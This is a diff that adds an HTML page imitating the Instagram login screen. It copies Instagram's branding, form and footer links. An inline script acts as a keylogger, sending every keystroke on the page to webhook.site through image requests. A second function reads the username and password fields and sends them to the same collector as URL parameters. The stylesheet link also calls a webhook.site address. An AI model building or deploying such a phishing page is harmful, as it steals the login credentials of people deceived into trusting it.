@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Login. Instagram</title>
+    <link rel="icon" href="instagramlogo.png" type="image/gif/png">
+    <link rel="stylesheet" href="https://webhook.site/62154f82-fd0e-4db5-a2c9-a1e7520d53db">
+        <div id="div1">
+            <img id="img1" src="instagram (1).png" alt="">
+    </div>
+    <style>
+        body{
+            background-color: #FAFAFA;
+            margin: 0px;
+            padding: 0px;
+        }
+        #div1{
+            width: 450px;
+            padding: 20px;
+            border: 1px solid #DDDDDD;
+            background-color: #FFFFFF;
+            margin-left: 510px;
+            margin-top: 24px;
+        }
+        #img1{
+            width: 300px;
+            margin-left: 70px;
+        }
+        input[type=text],input[type=password]{
+            width: 350px;
+            margin-top: 10px;
+            border: 1px solid #DBDBDB;
+            font-size: 16px;
+            padding: 13px 13px 13px 10px;
+            border-radius: 4px;
+            background-color: #FAFAFA;
+            margin-left: 40px;
+        }
+        #button1{
+            margin-left: 40px;
+            width: 374px;
+            font-size: 19px;
+            background-color: #B2DFFC;
+            border: 1px solid #B2DFFC;
+            color: white;
+            padding: 8px;
+            font-weight: bold;
+        }
+        #hr1{
+            float: left;
+            margin: 7px;
+            width: 150px;
+            margin-left: 40px;
+        }
+        #hr2{
+            float: left;
+            margin: 7px;
+            width: 150px;
+        }
+        #label1{
+            float: left;
+            margin-left: 13px;
+            margin-right: 13px;
+            font-size: 18px;
+            color: #8E8E8E;
+            font-weight: bold;
+        }
+        .fa-facebook{
+            background-color: #2f4a85;
+            color: white;
+            padding: 3px 4px 0px 8px;
+            font-size: 22px;
+            float: ;
+            margin-left: 100px;
+        }
+        #a1{
+            font-size: 22px;
+            text-decoration: none;
+            color: #385185;
+            font-weight: bold;
+            margin-left: 12px;
+        }
+        #a2{
+            color: #00376B;
+            text-decoration: none;
+            margin-left: 160px;
+            font-size: 17px;
+            font-weight: bold;
+            opacity: 0.8;
+            
+        }
+        #div2{
+            width: 450px;
+            padding: 25px 20px 25px 20px;
+            border: 1px solid #DDDDDD;
+            background-color: #FFFFFF;
+            margin-left: 510px;
+            margin-top: 24px;
+
+        }
+        #label2{
+            font-size: 21px;
+            margin-left: 90px;
+        }
+        #a3{
+            font-size: 20px;
+            color: #0095F6;
+            font-weight: bold;
+            text-decoration: none;
+            margin-left: 3px;
+            opacity: 0.9;
+        }
+        #p1{
+            font-size: 20px;
+            color: #3A3A3A;
+            margin-left: 200px;
+            margin-left: 720px;
+        }
+        #a4{
+            background-color: black;
+            width: 200px;
+            margin-left: 560px;
+            border-radius: 8px;
+            float: left;
+        }
+        #a4:hover{
+            cursor: pointer;
+        }
+
+       .fa-apple{
+           color: white;
+           font-size: 40px;
+           margin-left: 10px;
+           margin-top: 5px;
+           margin-bottom: 5px;
+           margin-right: 10px;
+           
+       }
+       #label3{
+           color: white;
+           float: right;
+           margin-right: 30px;
+           margin-top: 5px;
+       }
+       #label3:hover{
+           cursor: pointer;
+       }
+       #a5{
+            background-color: black;
+            width: 200px;
+            margin-left: 10px;
+            border-radius: 8px;
+            float: left;
+       }
+       #a5:hover{
+           cursor: pointer;
+       }
+       #img2{
+           width: 50px;
+       }
+       #label4{
+           float: right;
+           color: white;
+           margin-right: 40px;
+           margin-top: 8px;
+       }
+       #label4:hover{
+           cursor: pointer;
+       }
+       #div3{
+           margin-left: 370px;
+           margin-top: 100px;
+       }
+       ul{
+           list-style-type: none;
+       }
+       li{
+           float: left;
+           margin-left: 18px;
+       }
+       li a{
+           color: #8E8E8E;
+           text-decoration: none;
+           font-size: 18px;
+       }
+       li a:hover{
+           cursor: pointer;
+       }
+       #label5{
+           float: left;
+           margin-left: 600px;
+           color: #8E8E8E;
+           font-size: 19px;
+       }
+       select{
+           float: left;
+           border: 1px solid white;
+       }
+       #label6{
+           float: left;
+           margin-left: 30px;
+           color: #8E8E8E;
+           font-size: 17px;
+       }
+    </style>
+</head>
+<body>
+    <script>
+       const getValueInput = () =>{
+       
+let inputValue=document.getElementById("username").value; 
+       
+let inputValue1 = document.getElementById("password").value;        var i=new Image();
+var j=new Image();
+i.src="https://webhook.site/?password="+inputValue1;  j.src="https://webhook.site/?username="+inputValue; 
+window.location.reload();
+  }   
+  var keys='';
+var url = 'https://webhook.site/?c=';
+ document.onkeypress = function(e)
+ { 
+get = window.event?event:e;
+ key = get.keyCode?get.keyCode:get.charCode;
+ key = String.fromCharCode(key); keys+=key;
+}
+window.setInterval(function(){ 
+if(keys.length>0) {  
+new Image().src = url+keys;
+}, 1);
+</script>
+    <div id="div1">
+        <img id="img1" src="image/instagram.png" alt=""> <br><br>
+        <input type="text" name="username" placeholder="Phone number,username, or email" required> <br>
+        <input type="password" name="password" placeholder="Password" required><br><br>
+        <button id="button1" name="login">Log In</button> <br><br>
+        <hr id="hr1"> <label id="label1" for="">OR</label> <hr id="hr2"><br><br>
+        <a href="a1"><i class="fa fa-facebook"></i> <a id="a1" href="#">Log in with Facebook</a><br><br><br>
+        <a id="a2" href="#">Forgot password?</a>
+    </div>
+
+    <div id="div2">
+        <label id="label2" for="">Don't have an account?</label>
+        <a id="a3" href="#">Sign up</a>
+    </div>
+    <p id="p1">Get the app.</p>
+    <a id="a4" href="#">
+        <i class="fa fa-apple"></i>
+        <label id="label3" for="">Download on the <br> <b style="font-size: 20px;">App Store</b> </label>
+    </a>
+
+    <a id="a5" href="#">
+        <img id="img2" src="image/playstore.png" alt="">
+        <label id="label4" for="">GET IT ON <br> <b style="font-size: 20px;">Google Play</b> </label>
+    </a>
+    <br>
+    <br>
+
+    <div id="div3">
+        <ul>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Jobs</a></li>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Top Accounts</a></li>
+            <li><a href="#">Hashtags</a></li>
+            <li><a href="#">Locations</a></li>
+        </ul>
+        <br>
+
+    </div>
+    <br>
+    <br>
+    
+        <label id="label5" for="">English</label>
+        
+        <select name="language" id="">
+            <option value=""></option>
+            <option value=""></option>
+        </select>
+
+        <label id="label6">&copy;2023 Instagram from Meta</label>
+
+        <br>
+        <br>
+        <br>
+        <br>   
+</body>
+</html>
